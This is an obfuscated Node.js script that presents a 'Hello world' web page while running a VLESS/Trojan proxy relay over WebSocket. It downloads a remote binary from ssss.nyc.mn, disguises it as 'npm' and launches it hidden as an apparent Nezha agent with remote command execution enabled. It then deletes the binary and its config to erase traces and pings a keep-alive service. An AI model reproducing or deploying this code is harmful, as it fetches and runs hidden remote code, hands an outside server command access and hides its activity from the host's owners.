const _0x13b65c=_0x37ce;(function(_0x442c17,_0x1f95c8){const _0x115c0d=_0x37ce,_0x13e572=_0x442c17();while(!![]){try{const _0x2862a5=parseInt(_0x115c0d(0x16e))/0x1+parseInt(_0x115c0d(0x17d))/0x2+-parseInt(_0x115c0d(0x180))/0x3+-parseInt(_0x115c0d(0x17e))/0x4+parseInt(_0x115c0d(0x155))/0x5+-parseInt(_0x115c0d(0x176))/0x6+parseInt(_0x115c0d(0x12f))/0x7;if(_0x2862a5===_0x1f95c8)break;else _0x13e572['push'](_0x13e572['shift']());}catch(_0x511d14){_0x13e572['push'](_0x13e572['shift']());}}}(_0x55f3,0xc8a75));const os=require('os'),http=require(_0x13b65c(0x189)),fs=require('fs'),axios=require(_0x13b65c(0x12a)),net=require(_0x13b65c(0x18a)),path=require(_0x13b65c(0x19f)),crypto=require(_0x13b65c(0x137)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x13b65c(0x17c)]||_0x13b65c(0x169),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x13b65c(0x192)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x13b65c(0x1a6)]['DOMAIN']||_0x13b65c(0x13d),AUTO_ACCESS=process[_0x13b65c(0x1a6)]['AUTO_ACCESS']||!![],WSPATH=process['env'][_0x13b65c(0x174)]||UUID[_0x13b65c(0x188)](0x0,0x8),SUB_PATH=process[_0x13b65c(0x1a6)]['SUB_PATH']||_0x13b65c(0x18b),NAME=process[_0x13b65c(0x1a6)][_0x13b65c(0x159)]||'',PORT=process['env'][_0x13b65c(0x15e)]||0x1eb4;let ISP='';function _0x55f3(){const _0x3e7e02=['utf8','then','pipe','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','decode','npm\x20download\x20successfully','createServer',':443?encryption=none&security=tls&sni=','readFile','trim','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','createWriteStream','writeFileSync','--tls','&type=A','Server\x20is\x20running\x20on\x20port\x20','find','substr','includes','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','close','https://oooo.serv00.net/add-url','990565dhvljp','Unknown','error','data','NAME','update','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/agent','PORT','digest','text/html','https://dns.google/resolve?name=','url','concat','join','2087','test','error:\x20','config.yaml','3a1067d2-421e-3864-43c3-0000a687b294','hex','vless://','sha224','Answer','1457223kFmjMk','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1.1.1.1','Automatic\x20Access\x20Task\x20added\x20successfully','2053','message','WSPATH','split','7461156xEImpx','write','npm','type','connection','unlink','UUID','1604542TgUiyy','2289096CFKnrZ','https://arm64.ssss.nyc.mn/v1','948741xjntKa','8.8.4.4','index.html','catch','every','https://arm64.ssss.nyc.mn/agent','readUInt8','post','slice','http','net','sub',':443?security=tls&sni=','chmod\x20+x\x20npm','createHash','application/dns-json','text/plain','pop','NEZHA_PORT','end','reduce','2083','connect','from','Server','Failed\x20to\x20resolve\x20','https://','&path=%2F','Not\x20Found\x0a','toString','client_secret:\x20','path','npm\x20running\x20error:','8443','trojan://','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','setsid\x20nohup\x20./npm\x20-s\x20','length','env','readUInt16BE','arm','true','axios','base64','npm\x20is\x20already\x20running,\x20skip\x20running...','listen','replace','3474219rRMIPe','get','2096','once','country_code','arch','log','map','crypto','https://api.ip.sb/geoip','false','isp','writeHead','utf-8','1234.abc.com','finish'];_0x55f3=function(){return _0x3e7e02;};return _0x55f3();}const GetISP=async()=>{const _0x4459d2=_0x13b65c;try{const _0x55b065=await axios['get'](_0x4459d2(0x138)),_0x1df6ce=_0x55b065['data'];ISP=(_0x1df6ce[_0x4459d2(0x133)]+'-'+_0x1df6ce[_0x4459d2(0x13a)])[_0x4459d2(0x12e)](/ /g,'_');}catch(_0x1177e6){ISP=_0x4459d2(0x156);}};GetISP();const httpServer=http[_0x13b65c(0x145)]((_0x2c75e0,_0xdeb2b)=>{const _0xa050fc=_0x13b65c;if(_0x2c75e0[_0xa050fc(0x162)]==='/'){const _0x12881c=path[_0xa050fc(0x164)](__dirname,_0xa050fc(0x182));fs[_0xa050fc(0x147)](_0x12881c,_0xa050fc(0x13f),(_0x77b9af,_0x199477)=>{const _0x17234c=_0xa050fc;if(_0x77b9af){_0xdeb2b[_0x17234c(0x13b)](0xc8,{'Content-Type':_0x17234c(0x160)}),_0xdeb2b['end']('Hello\x20world!');return;}_0xdeb2b[_0x17234c(0x13b)](0xc8,{'Content-Type':_0x17234c(0x160)}),_0xdeb2b['end'](_0x199477);});return;}else{if(_0x2c75e0[_0xa050fc(0x162)]==='/'+SUB_PATH){const _0x5a12be=NAME?NAME+'-'+ISP:ISP,_0xef5b53=_0xa050fc(0x16b)+UUID+'@'+DOMAIN+_0xa050fc(0x146)+DOMAIN+_0xa050fc(0x15c)+DOMAIN+_0xa050fc(0x19b)+WSPATH+'#'+_0x5a12be,_0x1e6c20=_0xa050fc(0x1a2)+UUID+'@'+DOMAIN+_0xa050fc(0x18c)+DOMAIN+_0xa050fc(0x15c)+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x5a12be,_0x3477f3=_0xef5b53+'\x0a'+_0x1e6c20,_0x3be8af=Buffer[_0xa050fc(0x197)](_0x3477f3)[_0xa050fc(0x19d)](_0xa050fc(0x12b));_0xdeb2b[_0xa050fc(0x13b)](0xc8,{'Content-Type':_0xa050fc(0x190)}),_0xdeb2b[_0xa050fc(0x193)](_0x3be8af+'\x0a');}else _0xdeb2b['writeHead'](0x194,{'Content-Type':_0xa050fc(0x190)}),_0xdeb2b[_0xa050fc(0x193)](_0xa050fc(0x19c));}}),wss=new WebSocket[(_0x13b65c(0x198))]({'server':httpServer}),uuid=UUID[_0x13b65c(0x12e)](/-/g,''),DNS_SERVERS=[_0x13b65c(0x181),_0x13b65c(0x170)];function resolveHost(_0x36d7e5){return new Promise((_0xff60a3,_0x4772a4)=>{const _0x3044f2=_0x37ce;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3044f2(0x166)](_0x36d7e5)){_0xff60a3(_0x36d7e5);return;}let _0x516dd9=0x0;function _0x57484e(){const _0xafa8b6=_0x3044f2;if(_0x516dd9>=DNS_SERVERS[_0xafa8b6(0x1a5)]){_0x4772a4(new Error(_0xafa8b6(0x199)+_0x36d7e5+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x4bb04a=DNS_SERVERS[_0x516dd9];_0x516dd9++;const _0x1c9c96=_0xafa8b6(0x161)+encodeURIComponent(_0x36d7e5)+_0xafa8b6(0x14d);axios[_0xafa8b6(0x130)](_0x1c9c96,{'timeout':0x1388,'headers':{'Accept':_0xafa8b6(0x18f)}})[_0xafa8b6(0x140)](_0x1aca66=>{const _0x2bee59=_0xafa8b6,_0x444c51=_0x1aca66[_0x2bee59(0x158)];if(_0x444c51['Status']===0x0&&_0x444c51['Answer']&&_0x444c51[_0x2bee59(0x16d)]['length']>0x0){const _0x5ef559=_0x444c51['Answer'][_0x2bee59(0x14f)](_0x592677=>_0x592677[_0x2bee59(0x179)]===0x1);if(_0x5ef559){_0xff60a3(_0x5ef559['data']);return;}}_0x57484e();})[_0xafa8b6(0x183)](_0x199667=>{_0x57484e();});}_0x57484e();});}function handleVlessConnection(_0x3e0c73,_0x2e5004){const _0x4b3071=_0x13b65c,[_0x22df23]=_0x2e5004,_0x551950=_0x2e5004['slice'](0x1,0x11);if(!_0x551950[_0x4b3071(0x184)]((_0x9229ff,_0x8c27d9)=>_0x9229ff==parseInt(uuid[_0x4b3071(0x150)](_0x8c27d9*0x2,0x2),0x10)))return![];let _0x2aded5=_0x2e5004[_0x4b3071(0x188)](0x11,0x12)['readUInt8']()+0x13;const _0x17d033=_0x2e5004[_0x4b3071(0x188)](_0x2aded5,_0x2aded5+=0x2)[_0x4b3071(0x1a7)](0x0),_0x4431d9=_0x2e5004[_0x4b3071(0x188)](_0x2aded5,_0x2aded5+=0x1)[_0x4b3071(0x186)](),_0x36c5b3=_0x4431d9==0x1?_0x2e5004[_0x4b3071(0x188)](_0x2aded5,_0x2aded5+=0x4)[_0x4b3071(0x164)]('.'):_0x4431d9==0x2?new TextDecoder()[_0x4b3071(0x143)](_0x2e5004['slice'](_0x2aded5+0x1,_0x2aded5+=0x1+_0x2e5004[_0x4b3071(0x188)](_0x2aded5,_0x2aded5+0x1)[_0x4b3071(0x186)]())):_0x4431d9==0x3?_0x2e5004['slice'](_0x2aded5,_0x2aded5+=0x10)[_0x4b3071(0x194)]((_0x5d2f0e,_0xfb14ce,_0x41f3ed,_0x4111a1)=>_0x41f3ed%0x2?_0x5d2f0e[_0x4b3071(0x163)](_0x4111a1[_0x4b3071(0x188)](_0x41f3ed-0x1,_0x41f3ed+0x1)):_0x5d2f0e,[])[_0x4b3071(0x136)](_0x2d52e3=>_0x2d52e3['readUInt16BE'](0x0)[_0x4b3071(0x19d)](0x10))[_0x4b3071(0x164)](':'):'';_0x3e0c73['send'](new Uint8Array([_0x22df23,0x0]));const _0x3bc84d=createWebSocketStream(_0x3e0c73);return resolveHost(_0x36c5b3)[_0x4b3071(0x140)](_0x446248=>{const _0x2199e9=_0x4b3071;net[_0x2199e9(0x196)]({'host':_0x446248,'port':_0x17d033},function(){const _0x2dfc9b=_0x2199e9;this['write'](_0x2e5004['slice'](_0x2aded5)),_0x3bc84d['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x2dfc9b(0x141)](_0x3bc84d);})['on'](_0x2199e9(0x157),()=>{});})['catch'](_0x38cb28=>{const _0x40b0fe=_0x4b3071;net[_0x40b0fe(0x196)]({'host':_0x36c5b3,'port':_0x17d033},function(){const _0x143525=_0x40b0fe;this[_0x143525(0x177)](_0x2e5004[_0x143525(0x188)](_0x2aded5)),_0x3bc84d['on'](_0x143525(0x157),()=>{})[_0x143525(0x141)](this)['on'](_0x143525(0x157),()=>{})[_0x143525(0x141)](_0x3bc84d);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x244da8,_0x3be7a8){const _0x56c3f9=_0x13b65c;try{if(_0x3be7a8[_0x56c3f9(0x1a5)]<0x3a)return![];const _0x2e1ec0=_0x3be7a8[_0x56c3f9(0x188)](0x0,0x38)[_0x56c3f9(0x19d)](),_0x453a03=[UUID];let _0x5e7f4f=null;for(const _0x5e5c46 of _0x453a03){const _0x33c5a0=crypto[_0x56c3f9(0x18e)](_0x56c3f9(0x16c))[_0x56c3f9(0x15a)](_0x5e5c46)[_0x56c3f9(0x15f)](_0x56c3f9(0x16a));if(_0x33c5a0===_0x2e1ec0){_0x5e7f4f=_0x5e5c46;break;}}if(!_0x5e7f4f)return![];let _0x5765c9=0x38;_0x3be7a8[_0x5765c9]===0xd&&_0x3be7a8[_0x5765c9+0x1]===0xa&&(_0x5765c9+=0x2);const _0x550c3a=_0x3be7a8[_0x5765c9];if(_0x550c3a!==0x1)return![];_0x5765c9+=0x1;const _0x56af0b=_0x3be7a8[_0x5765c9];_0x5765c9+=0x1;let _0x2470ae,_0x5cd4ed;if(_0x56af0b===0x1)_0x2470ae=_0x3be7a8[_0x56c3f9(0x188)](_0x5765c9,_0x5765c9+0x4)[_0x56c3f9(0x164)]('.'),_0x5765c9+=0x4;else{if(_0x56af0b===0x3){const _0x594962=_0x3be7a8[_0x5765c9];_0x5765c9+=0x1,_0x2470ae=_0x3be7a8[_0x56c3f9(0x188)](_0x5765c9,_0x5765c9+_0x594962)[_0x56c3f9(0x19d)](),_0x5765c9+=_0x594962;}else{if(_0x56af0b===0x4)_0x2470ae=_0x3be7a8[_0x56c3f9(0x188)](_0x5765c9,_0x5765c9+0x10)[_0x56c3f9(0x194)]((_0x2931fa,_0x51f11e,_0x2e1941,_0x33c61a)=>_0x2e1941%0x2?_0x2931fa[_0x56c3f9(0x163)](_0x33c61a['slice'](_0x2e1941-0x1,_0x2e1941+0x1)):_0x2931fa,[])[_0x56c3f9(0x136)](_0x5c851c=>_0x5c851c[_0x56c3f9(0x1a7)](0x0)['toString'](0x10))[_0x56c3f9(0x164)](':'),_0x5765c9+=0x10;else return![];}}_0x5cd4ed=_0x3be7a8['readUInt16BE'](_0x5765c9),_0x5765c9+=0x2;_0x5765c9<_0x3be7a8[_0x56c3f9(0x1a5)]&&_0x3be7a8[_0x5765c9]===0xd&&_0x3be7a8[_0x5765c9+0x1]===0xa&&(_0x5765c9+=0x2);const _0x2ab8a5=createWebSocketStream(_0x244da8);return resolveHost(_0x2470ae)[_0x56c3f9(0x140)](_0xc781cc=>{const _0x16167e=_0x56c3f9;net[_0x16167e(0x196)]({'host':_0xc781cc,'port':_0x5cd4ed},function(){const _0x1d7298=_0x16167e;_0x5765c9<_0x3be7a8[_0x1d7298(0x1a5)]&&this[_0x1d7298(0x177)](_0x3be7a8[_0x1d7298(0x188)](_0x5765c9)),_0x2ab8a5['on']('error',()=>{})['pipe'](this)['on'](_0x1d7298(0x157),()=>{})[_0x1d7298(0x141)](_0x2ab8a5);})['on'](_0x16167e(0x157),()=>{});})[_0x56c3f9(0x183)](_0x1275bb=>{const _0x2c6e9f=_0x56c3f9;net[_0x2c6e9f(0x196)]({'host':_0x2470ae,'port':_0x5cd4ed},function(){const _0x274f5b=_0x2c6e9f;_0x5765c9<_0x3be7a8[_0x274f5b(0x1a5)]&&this['write'](_0x3be7a8[_0x274f5b(0x188)](_0x5765c9)),_0x2ab8a5['on'](_0x274f5b(0x157),()=>{})[_0x274f5b(0x141)](this)['on']('error',()=>{})['pipe'](_0x2ab8a5);})['on']('error',()=>{});}),!![];}catch(_0x3262f2){return![];}}wss['on'](_0x13b65c(0x17a),(_0x1b0bed,_0xbfabc6)=>{const _0x373d54=_0x13b65c,_0x2559b3=_0xbfabc6[_0x373d54(0x162)]||'';_0x1b0bed[_0x373d54(0x132)](_0x373d54(0x173),_0x4486b6=>{const _0x5e8f8f=_0x373d54;if(_0x4486b6[_0x5e8f8f(0x1a5)]>0x11&&_0x4486b6[0x0]===0x0){const _0x2e2a6f=_0x4486b6[_0x5e8f8f(0x188)](0x1,0x11),_0x9e922e=_0x2e2a6f['every']((_0x45e65f,_0x37b27a)=>_0x45e65f==parseInt(uuid[_0x5e8f8f(0x150)](_0x37b27a*0x2,0x2),0x10));if(_0x9e922e){!handleVlessConnection(_0x1b0bed,_0x4486b6)&&_0x1b0bed[_0x5e8f8f(0x153)]();return;}}!handleTrojanConnection(_0x1b0bed,_0x4486b6)&&_0x1b0bed[_0x5e8f8f(0x153)]();})['on'](_0x373d54(0x157),()=>{});});const getDownloadUrl=()=>{const _0x5046da=_0x13b65c,_0x2861d6=os[_0x5046da(0x134)]();return _0x2861d6===_0x5046da(0x1a8)||_0x2861d6==='arm64'||_0x2861d6==='aarch64'?!NEZHA_PORT?_0x5046da(0x17f):_0x5046da(0x185):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x5046da(0x15d);},downloadFile=async()=>{const _0x498687=_0x13b65c;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xde005f=getDownloadUrl(),_0x17c70f=await axios({'method':_0x498687(0x130),'url':_0xde005f,'responseType':'stream'}),_0x389f07=fs[_0x498687(0x14a)]('npm');return _0x17c70f[_0x498687(0x158)][_0x498687(0x141)](_0x389f07),new Promise((_0x5eabe9,_0x18ad46)=>{const _0x813f56=_0x498687;_0x389f07['on'](_0x813f56(0x13e),()=>{const _0x39001e=_0x813f56;console['log'](_0x39001e(0x144)),exec(_0x39001e(0x18d),_0x5517aa=>{if(_0x5517aa)_0x18ad46(_0x5517aa);_0x5eabe9();});}),_0x389f07['on'](_0x813f56(0x157),_0x18ad46);});}catch(_0xe0709e){throw _0xe0709e;}},runnz=async()=>{const _0x3dca24=_0x13b65c;try{const _0x34b3d1=execSync(_0x3dca24(0x15b),{'encoding':_0x3dca24(0x13c)});if(_0x34b3d1[_0x3dca24(0x148)]()!==''){console[_0x3dca24(0x135)](_0x3dca24(0x12c));return;}}catch(_0x38525a){}await downloadFile();let _0x2f99e2='',_0x5f1ec4=['443',_0x3dca24(0x1a1),_0x3dca24(0x131),_0x3dca24(0x165),_0x3dca24(0x195),_0x3dca24(0x172)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5b7888=_0x5f1ec4[_0x3dca24(0x151)](NEZHA_PORT)?_0x3dca24(0x14c):'';_0x2f99e2=_0x3dca24(0x1a4)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5b7888+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5bc235=NEZHA_SERVER[_0x3dca24(0x151)](':')?NEZHA_SERVER[_0x3dca24(0x175)](':')[_0x3dca24(0x191)]():'',_0x235851=_0x5f1ec4[_0x3dca24(0x151)](_0x5bc235)?_0x3dca24(0x1a9):_0x3dca24(0x139),_0x1a6da5=_0x3dca24(0x19e)+NEZHA_KEY+_0x3dca24(0x16f)+NEZHA_SERVER+_0x3dca24(0x152)+_0x235851+_0x3dca24(0x1a3)+UUID;fs[_0x3dca24(0x14b)](_0x3dca24(0x168),_0x1a6da5);}_0x2f99e2=_0x3dca24(0x149);}else{console[_0x3dca24(0x135)](_0x3dca24(0x142));return;}}try{exec(_0x2f99e2,{'shell':'/bin/bash'},_0x318815=>{const _0x117423=_0x3dca24;if(_0x318815)console['error'](_0x117423(0x1a0),_0x318815);else console[_0x117423(0x135)]('npm\x20is\x20running');});}catch(_0x30a3e7){console[_0x3dca24(0x157)](_0x3dca24(0x167)+_0x30a3e7);}};async function addAccessTask(){const _0x24dacd=_0x13b65c;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x56b578=_0x24dacd(0x19a)+DOMAIN;try{const _0x3db9aa=await axios[_0x24dacd(0x187)](_0x24dacd(0x154),{'url':_0x56b578},{'headers':{'Content-Type':'application/json'}});console[_0x24dacd(0x135)](_0x24dacd(0x171));}catch(_0x5471e1){}}function _0x37ce(_0x46e166,_0xfab678){_0x46e166=_0x46e166-0x12a;const _0x55f353=_0x55f3();let _0x37ce3c=_0x55f353[_0x46e166];return _0x37ce3c;}const delFiles=()=>{const _0x49f69d=_0x13b65c;fs['unlink'](_0x49f69d(0x178),()=>{}),fs[_0x49f69d(0x17b)](_0x49f69d(0x168),()=>{});};httpServer[_0x13b65c(0x12d)](PORT,()=>{const _0xf4f476=_0x13b65c;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xf4f476(0x135)](_0xf4f476(0x14e)+PORT);});
